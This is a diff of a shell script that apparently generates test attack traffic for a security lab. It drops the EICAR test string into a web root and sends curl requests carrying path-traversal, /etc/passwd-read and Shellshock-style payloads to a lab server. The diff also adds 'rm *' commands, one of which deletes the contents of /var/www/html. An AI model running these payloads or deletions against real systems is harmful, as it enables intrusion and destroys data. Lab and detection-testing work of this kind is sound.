@@ -137,12 +137,13 @@ Task 6 Completed
 
 ${RESET}"
 
-sudo systemctl status nginx
 
 cat > server_ssh.sh <<EOF
+sudo systemctl status nginx
 cd /var/www/html/
 sudo touch eicar.file
 echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | sudo tee eicar.file
+rm *
 exit
 EOF
 chmod +x server_ssh.sh
@@ -213,6 +214,7 @@ curl http://192.168.10.20/?item=../../../../WINNT/win.ini
 curl http://192.168.10.20/eicar.file
 curl http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd
 curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://192.168.10.20/cgi-bin/test-critical
+rm *
 exit
 EOF
 
